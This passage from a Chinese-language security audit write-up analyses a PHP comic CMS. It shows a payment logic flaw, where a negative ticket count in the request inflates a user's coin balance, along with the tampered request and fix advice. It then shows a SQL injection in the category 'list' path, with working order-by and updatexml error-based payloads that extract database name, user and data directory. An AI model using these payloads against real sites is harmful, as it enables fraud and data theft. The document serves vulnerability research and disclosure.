Pay_Ali_Mode;</span><br><span class="line">        <span class="variable">$arr</span>[<span class="string">&#x27;pay&#x27;</span>][<span class="string">&#x27;is_qqpay&#x27;</span>] = Pay_QQ_Mode;</span><br></pre></td></tr></table></figure>

<p>上面主要是对数据之间关系的定义，关键在下方代码中，如何让我们的恶意订单成功并入库</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="comment">#sys/apps/controllers/api/Pay.php</span></span><br><span class="line"> <span class="comment">//充值订单入库</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$type</span> = <span class="variable language_">$this</span>-&gt;input-&gt;<span class="title function_ invoke__">get_post</span>(<span class="string">&#x27;type&#x27;</span>,<span class="literal">true</span>);</span><br><span class="line">    <span class="variable">$pay</span> = <span class="variable language_">$this</span>-&gt;input-&gt;<span class="title function_ invoke__">get_post</span>(<span class="string">&#x27;pay&#x27;</span>,<span class="literal">true</span>);</span><br><span class="line">    <span class="variable">$rmb</span> = (<span class="keyword">int</span>)<span class="variable language_">$this</span>-&gt;input-&gt;<span class="title function_ invoke__">get_post</span>(<span class="string">&#x27;rmb&#x27;</span>);</span><br><span class="line">    <span class="variable">$num</span> = (<span class="keyword">int</span>)<span class="variable language_">$this</span>-&gt;input-&gt;<span class="title function_ invoke__">get_post</span>(<span class="string">&#x27;num&#x27;</span>);</span><br><span class="line">    <span class="variable">$day</span> = (<span class="keyword">int</span>)<span class="variable language_">$this</span>-&gt;input-&gt;<span class="title function_ invoke__">get_post</span>(<span class="string">&#x27;day&#x27;</span>);</span><br><span class="line">	<span class="variable">$card</span> = <span class="variable language_">$this</span>-&gt;input-&gt;<span class="title function_ invoke__">get_post</span>(<span class="string">&#x27;card&#x27;</span>,<span class="literal">true</span>);</span><br><span class="line">    <span class="variable">$dayarr</span> = <span class="keyword">array</span>(<span class="number">30</span>,<span class="number">90</span>,<span class="number">180</span>,<span class="number">365</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$day</span> == <span class="number">0</span>) <span class="variable">$day</span> = <span class="number">30</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$type</span> == <span class="string">&#x27;cion&#x27;</span> &amp;&amp; (<span class="variable">$rmb</span> == <span class="number">0</span> || <span class="variable">$rmb</span> &gt;<span class="number">9999</span>)) <span class="title function_ invoke__">get_json</span>(<span class="string">&#x27;金额错误!!!&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$type</span> == <span class="string">&#x27;cion&#x27;</span> &amp;&amp; <span class="variable">$rmb</span> &lt; Pay_Rmb_Min) <span class="title function_ invoke__">get_json</span>(<span class="string">&#x27;最低充值金额&#x27;</span>.Pay_Rmb_Min.<span class="string">&#x27;元&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$type</span> == <span class="string">&#x27;ticket&#x27;</span> &amp;&amp; <span class="variable">$num</span> == <span class="number">0</span>) <span class="title function_ invoke__">get_json</span>(<span class="string">&#x27;月票数量错误!!!&#x27;</span>);</span><br><span class="line">    <span class="comment">/*这里有个很明显的漏洞就是，对月票数的限制只有不为0，而对于&lt;0的值，很明显可以绕过*/</span></span><br><span class="line">    </span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$type</span> == <span class="string">&#x27;card&#x27;</span> &amp;&amp; <span class="keyword">empty</span>(<span class="variable">$card</span>)) <span class="title function_ invoke__">get_json</span>(<span class="string">&#x27;卡密不能为空!!!&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$type</span> == <span class="string">&#x27;vip&#x27;</span> &amp;&amp; !<span class="title function_ invoke__">in_array</span>(<span class="variable">$day</span>, <span class="variable">$dayarr</span>)) <span class="title function_ invoke__">get_json</span>(<span class="string">&#x27;Vip时间错误!!!&#x27;</span>);</span><br><span class="line">    <span class="variable">$parr</span> = <span class="keyword">array</span>(<span class="string">&#x27;cion&#x27;</span>,<span class="string">&#x27;wxpay&#x27;</span>,<span class="string">&#x27;alipay&#x27;</span>,<span class="string">&#x27;qqpay&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$pay</span>, <span class="variable">$parr</span>)) <span class="variable">$pay</span> = <span class="string">&#x27;cion&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>金币支付代码流程分析</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#sys/apps/controllers/api/Pay.php</span></span><br><span class="line">        <span class="comment">//金币支付</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$pay</span> == <span class="string">&#x27;cion&#x27;</span>)&#123;</span><br><span class="line">            <span class="comment">//判断金币是否不足</span></span><br><span class="line">            <span class="variable">$cion</span> = <span class="variable">$rmb</span> * Pay_Rmb_Cion;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$cion</span> &gt; <span class="variable">$user</span>[<span class="string">&#x27;cion&#x27;</span>]) <span class="title function_ invoke__">get_json</span>(Pay_Cion_Name.<span class="string">&#x27;不足，请先充值!!!&#x27;</span>);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">//购买月票</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$type</span> == <span class="string">&#x27;ticket&#x27;</span>)&#123;</span><br><span class="line">                <span class="variable">$edit</span>[<span class="string">&#x27;ticket&#x27;</span>] = <span class="variable">$user</span>[<span class="string">&#x27;ticket&#x27;</span>]+<span class="variable">$num</span>;</span><br><span class="line">                <span class="variable">$name</span> = <span class="string">&#x27;购买月票成功&#x27;</span>;</span><br><span class="line">                <span class="variable">$text</span> = <span class="string">&#x27;您花费&#x27;</span>.<span class="variable">$cion</span>.Pay_Cion_Name.<span class="string">&#x27;，成功购买了&#x27;</span>.<span class="variable">$num</span>.<span class="string">&#x27;张月票&#x27;</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$name</span> = <span class="string">&#x27;购买VIP会员成功&#x27;</span>;</span><br><span class="line">                <span class="variable">$text</span> = <span class="string">&#x27;您花费&#x27;</span>.<span class="variable">$cion</span>.Pay_Cion_Name.<span class="string">&#x27;，成功购买了&#x27;</span>.<span class="variable">$day</span>.<span class="string">&#x27;天Vip会员&#x27;</span>;</span><br><span class="line">                <span class="variable">$edit</span>[<span class="string">&#x27;vip&#x27;</span>] = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$user</span>[<span class="string">&#x27;viptime&#x27;</span>] &gt; <span class="title function_ invoke__">time</span>())&#123;</span><br><span class="line">                    <span class="variable">$edit</span>[<span class="string">&#x27;viptime&#x27;</span>] = <span class="variable">$user</span>[<span class="string">&#x27;viptime&#x27;</span>]+<span class="number">86400</span>*<span class="variable">$day</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="variable">$edit</span>[<span class="string">&#x27;viptime&#x27;</span>] = <span class="title function_ invoke__">time</span>()+<span class="number">86400</span>*<span class="variable">$day</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//判断赠送天数</span></span><br><span class="line">                <span class="keyword">if</span>((<span class="variable">$day</span>/<span class="number">30</span>) &gt; Pay_Vip_Month)&#123;</span><br><span class="line">                	<span class="variable">$sday</span> = (<span class="keyword">int</span>)((<span class="variable">$day</span>/<span class="number">30</span>) - Pay_Vip_Month);</span><br><span class="line">                	<span class="keyword">if</span>(<span class="variable">$sday</span> &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                		<span class="variable">$edit</span>[<span class="string">&#x27;viptime&#x27;</span>] = <span class="variable">$edit</span>[<span class="string">&#x27;viptime&#x27;</span>]+<span class="number">86400</span>*<span class="variable">$sday</span>;</span><br><span class="line">                		<span class="variable">$text</span> .= <span class="string">&#x27;，系统赠送您&#x27;</span>.<span class="variable">$sday</span>.<span class="string">&#x27;天&#x27;</span>;</span><br><span class="line">                	&#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;    </span><br></pre></td></tr></table></figure>

<p>我们实现月票反向充值金币的前提绕过就算这个对金币数量是否充足的绕过，<code>$cion</code>中<code>rmb</code>是默认大于<code>Pay_Rmb_Min</code>这个全局变量值为<code>1</code>，而<code>Pay_Rmb_Cion</code>也是默认为<code>10</code><br>而<code>$user[&#39;cion&#39;]</code>是我们自带的开始金币数，其中我们能控制得参数就只有<code>rmb</code>，但其实还有<code>num</code>。</p>
<p>当我们购买1张月票数时，<code>rmb</code>为<code>￥1</code>，但当我们购买<code>-1</code>张月票时呢，因为<code>rmb</code>为真，已经通过了其判断，但是当<code>num</code>计算总金额时，并没有对<code>num值</code>的逻辑性进行判断，<br>因此<br>&#x3D;&#x3D;&gt;<br>当<code>type=ticket&amp;rmb=1&amp;day=30&amp;num=10&amp;pay=cion</code><br>【花费<code>rmb=1*10</code>等价金币买月票，也就是花费100金币买10张月票】<br>改成<br><code>type=ticket&amp;rmb=1&amp;day=30&amp;num=-10&amp;pay=cion</code><br>【花费<code>rmb=1*(-10)</code>等价月票，也就是花费10月票买100金币，相当于花-100金币，买-10张的月票</p>
<blockquote>
<p><strong>金币&#x3D;金币-(-10)</strong></p>
<p>  <strong>月票&#x3D;月票+(-10)</strong></p>
</blockquote>
<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>先给我的账户修改一下金币数</p>
<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221124135152005.png"><img src="/CMS-Test/image-20221124135152005.png" alt="image-20221124135152005"></a></p>
<p>然后购买月票抓包看看数据</p>
<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221124135229059.png"><img src="/CMS-Test/image-20221124135229059.png" alt="image-20221124135229059"></a></p>
<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221124135257569.png"><img src="/CMS-Test/image-20221124135257569.png" alt="image-20221124135257569"></a></p>
<blockquote>
<p><code>type=ticket&amp;rmb=1&amp;day=30&amp;num=1&amp;pay=cion</code><br>#可以看到我们的购买数据完全显示出来<br>type:购买的商品类型<br>rmb:花费金额<br>day:购买物品时限<br>num:购买数量<br>pay:支付方式</p>
</blockquote>
<p>先试试修改一下购买数量</p>
<p>【金币<code>10000</code>，购买<code>1</code>张月票花<code>10</code>金币，应该还剩<code>9990</code>】</p>
<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221124141049742.png"><img src="/CMS-Test/image-20221124141049742.png" alt="image-20221124141049742"></a></p>
<p>【金币<code>10000</code>，购买<code>10</code>张月票花<code>100</code>金币，应该还剩<code>9900</code>】</p>
<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221124141119999.png"><img src="/CMS-Test/image-20221124141119999.png" alt="image-20221124141119999"></a></p>
<p>然后我们再看看我们的剩余金额</p>
<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221124141240128.png"><img src="/CMS-Test/image-20221124141240128.png" alt="image-20221124141240128"></a></p>
<p>发现扣了<code>200</code>金币（应该是不小心发了两次包）</p>
<p>【还剩<code>9800</code>】</p>
<p>虽然没有实现我们的目的，既然在我们金额能承受范围内可以，那么试试超过我们金额以外的呢</p>
<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221124141731975.png"><img src="/CMS-Test/image-20221124141731975.png" alt="image-20221124141731975"></a></p>
<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221124141845487.png"><img src="/CMS-Test/image-20221124141845487.png" alt="image-20221124141845487"></a></p>
<p>发现显示金币不够，既然正常的数据不行，那么我们把数量改成负数呢</p>
<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221124141931064.png"><img src="/CMS-Test/image-20221124141931064.png" alt="image-20221124141931064"></a></p>
<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221124141937935.png"><img src="/CMS-Test/image-20221124141937935.png" alt="image-20221124141937935"></a></p>
<p>居然购买成功？</p>
<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221124142002433.png"><img src="/CMS-Test/image-20221124142002433.png" alt="image-20221124142002433"></a></p>
<p>我们发现我们的月票数减少了，但是金币数增加了，而且月票数为负数，明显是有问题的</p>
<p>在购买记录中，我们发下确实也有记录</p>
<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221124142151770.png"><img src="/CMS-Test/image-20221124142151770.png" alt="image-20221124142151770"></a></p>
<p>而获取金币的方式本来应该是通过<code>rmb</code>支付</p>
<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221124142246178.png"><img src="/CMS-Test/image-20221124142246178.png" alt="image-20221124142246178"></a></p>
<p>但是这里通过简单的修改月票数为负数，即可反向增加金币数量，且没有上限制</p>
<p>这里我又把<code>type</code>和<code>pay</code>两者交换</p>
<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221124142618960.png"><img src="/CMS-Test/image-20221124142618960.png" alt="image-20221124142618960"></a></p>
<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221124142629873.png"><img src="/CMS-Test/image-20221124142629873.png" alt="image-20221124142629873"></a></p>
<p>发现依旧购买成功，还显示购买<code>10</code>金币，但是月票数并没有变化，而金币却减少了，应该是月票转金币不符合逻辑，但是发的请求包中的语句符合充值语句，于是按照语法，扣除了<code>num</code>数量的金币</p>
<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221124142651295.png"><img src="/CMS-Test/image-20221124142651295.png" alt="image-20221124142651295"></a></p>
<p>当我又改成且修改<code>rmb</code>改成<code>1000</code></p>
<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221124150939398.png"><img src="/CMS-Test/image-20221124150939398.png" alt="image-20221124150939398"></a></p>
<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221124151113186.png"><img src="/CMS-Test/image-20221124151113186.png" alt="image-20221124151113186"></a></p>
<p>在交易记录中显示增加了<code>10000</code>金币，但是实际金币是在减少</p>
<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221124151205737.png"><img src="/CMS-Test/image-20221124151205737.png" alt="image-20221124151205737"></a></p>
<p>这是因为不符合充值逻辑</p>
<blockquote>
<p>危害<br>通过该漏洞，即可导致金币、月票、vip三者可以无限制</p>
</blockquote>
<h4 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h4><blockquote>
<p>该漏洞的形成的根本原因在于<br>在sys&#x2F;apps&#x2F;controllers&#x2F;api&#x2F;Pay.php中<br>1.对客户端用户可控参数的限制不牢，考虑不全，<br>2.对于负数的清况，<br>3.以及对不合逻辑的支付方式的判断不够</p>
<p>建议<br>1.对客户端可控参数进行加密，让用户无法修改其值<br>2.并且对参数的合理性以及逻辑性加强判断，完善整体代码逻辑，加强不同参数之间的联系，以及参数变化前后的逻辑性<br>3.最好不要让用户能对发送到服务器的数据进行修改或控制</p>
</blockquote>
<h3 id="2-SQL注入漏洞"><a href="#2-SQL注入漏洞" class="headerlink" title="2.SQL注入漏洞"></a>2.SQL注入漏洞</h3><h4 id="代码分析-漏洞利用"><a href="#代码分析-漏洞利用" class="headerlink" title="代码分析+漏洞利用"></a>代码分析+漏洞利用</h4><p>这里利用了<code>Acunetix</code>对站点扫描，发现了在主页存在高危的<code>SQL</code>漏洞</p>
<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221126214707108.png"><img src="/CMS-Test/image-20221126214707108.png" alt="image-20221126214707108"></a></p>
<p>发请求包，后发现其响应包的结果为数据库报错</p>
<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221126214959756.png"><img src="/CMS-Test/image-20221126214959756.png" alt="image-20221126214959756"></a></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>A Database Error Occurred<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;body&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">              Error Number: 1064</span><br><span class="line">          <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">     You have an error in your SQL syntax; check the manual that corresponds to     your MySQL server version for the right syntax to use near &#x27;&#x27; at line 1</span><br><span class="line">          <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">              select  count(*) as counta from mc_book where yid=0 and pay=0 and serialize=&#x27;连载&#x27; and cid in(1&amp;#039) order by addtime desc</span><br><span class="line">              #发现1&#x27;被插入in()中</span><br><span class="line">          <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">              Filename: D:/phpstudy_pro/WWW/127.0.0.3/sys/apps/models/Mcdb.php</span><br><span class="line">          <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">          Line Number: 38</span><br><span class="line">          <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>于是尝试再<code>in()</code>中能否实现闭合并执行恶意<code>sql</code>语句</p>
<p>但是在源码中对sql语句有一定过滤</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#sys/apps/user/Category.php</span></span><br><span class="line"><span class="title function_ invoke__">defined</span>(<span class="string">&#x27;BASEPATH&#x27;</span>) OR <span class="keyword">exit</span>(<span class="string">&#x27;No direct script access allowed&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Category</span> <span class="keyword">extends</span> <span class="title">Mccms_Controller</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="built_in">parent</span>::<span class="title function_ invoke__">__construct</span>();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//智能检索</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$uri</span> = <span class="variable language_">$this</span>-&gt;uri-&gt;<span class="title function_ invoke__">uri_string</span>();</span><br><span class="line">        <span class="variable">$n</span> = <span class="title function_ invoke__">strpos</span>(<span class="variable">$uri</span>,<span class="string">&#x27;/index&#x27;</span>) !== <span class="literal">false</span> ? <span class="number">3</span> : <span class="number">2</span>;</span><br><span class="line">        <span class="variable">$arr</span> = <span class="title function_ invoke__">safe_replace</span>(<span class="variable">$this</span>-&gt;uri-&gt;<span class="title function_ invoke__">uri_to_assoc</span>(<span class="variable">$n</span>));</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;tpl-&gt;<span class="title function_ invoke__">category</span>(<span class="variable">$arr</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进<code>safe_replace</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#sys/apps/helpers/common_helper.php</span></span><br><span class="line"><span class="comment">//SQL过滤</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_replace</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$string</span>)) &#123;</span><br><span class="line">		<span class="keyword">foreach</span>(<span class="variable">$string</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">			<span class="variable">$string</span>[<span class="title function_ invoke__">safe_replace</span>(<span class="variable">$k</span>)] = <span class="title function_ invoke__">safe_replace</span>(<span class="variable">$v</span>); </span><br><span class="line">		&#125;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$string</span>))&#123;</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;%20&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">            <span class="comment">/*   %20可以用+代替   */</span></span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;%27&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;%2527&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;&amp;#039;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&amp;quot;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;*&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;&amp;lt;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;&amp;gt;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;\%&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_encode</span>(<span class="variable">$string</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们先简单构造一个</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">GET</span> /index.php/book/category/order/addtime/pay/<span class="number">1</span>/finish/<span class="number">1</span>/list/<span class="number">1</span>)+order+by+<span class="number">5</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure>

<p>发现报错</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">从</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>select * from mc_book where yid=0 and pay=0 and serialize=&#x27;连载&#x27; and cid in(1&amp;#039) order by addtime desc<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">变成</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Unknown column &#x27;5&#x27; in &#x27;order clause&#x27;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">由符号报错，变成命令报错，看来我们的sql命令在这个构造中是可以执行的</span><br></pre></td></tr></table></figure>

<p>通过<code>order by</code>，判断出当前列数只有<code>1</code>列</p>
<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221127003105524.png"><img src="/CMS-Test/image-20221127003105524.png" alt="image-20221127003105524"></a></p>
<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221127003130496.png"><img src="/CMS-Test/image-20221127003130496.png" alt="image-20221127003130496"></a></p>
<p>此处的注入点代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#125;<span class="keyword">elseif</span>(<span class="variable">$k</span> == <span class="string">&#x27;list&#x27;</span>)&#123; <span class="comment">//分类</span></span><br><span class="line">                   <span class="variable">$title</span>[] = <span class="variable">$data</span>[<span class="string">&#x27;title&#x27;</span>] = <span class="title function_ invoke__">getzd</span>(<span class="string">&#x27;book_class&#x27;</span>,<span class="string">&#x27;name&#x27;</span>,<span class="variable">$v</span>);</span><br><span class="line">                   <span class="keyword">if</span>((<span class="keyword">int</span>)<span class="variable">$v</span> &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                       <span class="variable">$cids</span> = <span class="title function_ invoke__">getcid</span>(<span class="variable">$v</span>);</span><br><span class="line">                       <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$cids</span>))&#123;</span><br><span class="line">                           <span class="variable">$sql</span> .= <span class="string">&quot; and cid in(&quot;</span>.<span class="variable">$cids</span>.<span class="string">&quot;)&quot;</span>;</span><br><span class="line">                       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                           <span class="variable">$sql</span> .= <span class="string">&quot; and cid=&quot;</span>.<span class="variable">$cids</span>;</span><br><span class="line">                       &#125;</span><br><span class="line">                   &#125;</span><br></pre></td></tr></table></figure>

<p><code>$cid</code>就是引起<code>sql</code>注入的参数点</p>
<p>跟进<code>getcid</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//解析多个分类ID  如 cid=1,2,3,4,5,6</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getcid</span>(<span class="params"><span class="variable">$CID</span>,<span class="variable">$type</span>=<span class="string">&#x27;class&#x27;</span>,<span class="variable">$zd</span>=<span class="string">&#x27;fid&#x27;</span></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$ci</span> = &amp;<span class="title function_ invoke__">get_instance</span>();</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$CID</span>))&#123;</span><br><span class="line">		<span class="variable">$ClassArr</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>,<span class="variable">$CID</span>);</span><br><span class="line">		<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">count</span>(<span class="variable">$ClassArr</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">			<span class="variable">$sql</span>=<span class="string">&quot;select id from &quot;</span>.Mc_SqlPrefix.<span class="variable">$type</span>.<span class="string">&quot; where &quot;</span>.<span class="variable">$zd</span>.<span class="string">&quot;=&#x27;<span class="subst">$ClassArr</span>[<span class="subst">$i</span>]&#x27;&quot;</span>;<span class="comment">//sql语句的组织返回</span></span><br><span class="line">			<span class="variable">$result</span>=<span class="variable">$ci</span>-&gt;db-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>)-&gt;<span class="title function_ invoke__">result</span>();</span><br><span class="line">			<span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$result</span>))&#123;</span><br><span class="line">				<span class="keyword">foreach</span> (<span class="variable">$result</span> <span class="keyword">as</span> <span class="variable">$row</span>) &#123;</span><br><span class="line">					<span class="variable">$ClassArr</span>[]=<span class="variable">$row</span>-&gt;id;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="variable">$CID</span>=<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;,&#x27;</span>,<span class="variable">$ClassArr</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$CID</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>尝试后发现无法进行联合注入</p>
<p>只能试试报错注入或者盲注</p>
<p>盲注试了试发现是无法得到反应的</p>
<p>于是我试了试报错注入</p>
<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">GET</span> /<span class="selector-tag">index</span><span class="selector-class">.php</span>/<span class="selector-tag">book</span>/<span class="selector-tag">category</span>/<span class="selector-tag">order</span>/<span class="selector-tag">addtime</span>/<span class="selector-tag">pay</span>/<span class="number">1</span>/<span class="selector-tag">finish</span>/<span class="number">1</span>/<span class="selector-tag">list</span>/<span class="number">1</span>)+<span class="selector-tag">and</span>+<span class="selector-tag">updatexml</span>(<span class="number">1</span>,<span class="built_in">concat</span>(<span class="number">0</span>x7e,<span class="built_in">database</span>(),<span class="number">0</span>x7e,<span class="built_in">user</span>(),<span class="number">0</span>x7e,<span class="variable">@@datadir</span>),<span class="number">1</span>)%<span class="number">23</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221127141028144.png"><img src="/CMS-Test/image-20221127141028144.png" alt="image-20221127141028144"></a></p>
<p>果然是报错注入，我们得到了我们想要的数据，虽然因为报错函数限制了显示数据字符个数，用<code>substring</code>即可</p>
